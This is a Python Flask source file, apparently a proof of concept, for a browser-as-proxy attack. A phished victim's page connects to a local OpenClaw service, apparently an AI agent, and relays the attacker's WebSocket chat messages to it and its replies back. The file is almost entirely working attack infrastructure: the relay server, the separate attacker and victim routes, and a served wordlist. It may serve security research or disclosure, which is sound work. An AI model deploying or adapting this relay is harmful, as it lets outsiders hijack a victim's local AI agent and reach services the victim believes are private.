"""
Proof-of-concept: Attacker WebSocket server for browser-as-proxy.

- Attacker opens / and uses the chat UI (connects to /ws as "attacker").
- Victim opens /victim (e.g. after being phished); that page connects to OpenClaw
  on localhost and to /ws as "bridge".
- Messages from attacker are relayed to the bridge; the victim's page sends them to OpenClaw.
- OpenClaw replies are sent from bridge to attacker and shown in the chat.

Run: python proxy_server.py
Then open http://localhost:5001 (attacker) and http://localhost:5001/victim (victim, in another browser or machine).
"""

import os
import threading
ROOT = os.path.dirname(os.path.abspath(__file__))
from flask import Flask, send_from_directory
from flask_sock import Sock

app = Flask(__name__, static_folder="proxy_static")
sock = Sock(app)

# One attacker and one bridge connection; first message sets role.
attacker_ws = None
bridge_ws = None
attacker_lock = threading.Lock()
bridge_lock = threading.Lock()


def set_attacker(ws):
    global attacker_ws
    with attacker_lock:
        attacker_ws = ws


def set_bridge(ws):
    global bridge_ws
    with bridge_lock:
        bridge_ws = ws


def get_other(role):
    if role == "attacker":
        with bridge_lock:
            return bridge_ws
    with attacker_lock:
        return attacker_ws


def clear_attacker():
    global attacker_ws
    with attacker_lock:
        attacker_ws = None


def clear_bridge():
    global bridge_ws
    with bridge_lock:
        bridge_ws = None


@sock.route("/ws")
def proxy_ws(ws):
    role = None
    try:
        data = ws.receive()
        if not data:
            return
        import json
        msg = json.loads(data)
        if msg.get("type") == "role":
            role = msg.get("role")
            if role not in ("attacker", "bridge"):
                ws.close(reason="invalid role")
                return
            if role == "attacker":
                set_attacker(ws)
            else:
                set_bridge(ws)
        else:
            ws.close(reason="first message must be role")
            return
    except Exception:
        return

    other = get_other(role)
    try:
        while True:
            data = ws.receive()
            if data is None:
                break
            other_conn = get_other(role)
            if other_conn:
                try:
                    other_conn.send(data)
                except Exception:
                    # Clear dead connection so next send doesn't reuse it
                    if role == "attacker":
                        clear_bridge()
                    else:
                        clear_attacker()
    except Exception:
        pass
    finally:
        if role == "attacker":
            clear_attacker()
        else:
            clear_bridge()


@app.route("/")
def attacker_page():
    return send_from_directory("proxy_static", "attacker.html")


@app.route("/victim")
def victim_page():
    return send_from_directory("proxy_static", "victim.html")


@app.route("/wordlist.txt")
def wordlist():
    return send_from_directory(ROOT, "wordlist.txt")


if __name__ == "__main__":
    # threaded=True so attacker and bridge can both block on ws.receive()
    app.run(host="0.0.0.0", port=5001, debug=False, threaded=True)
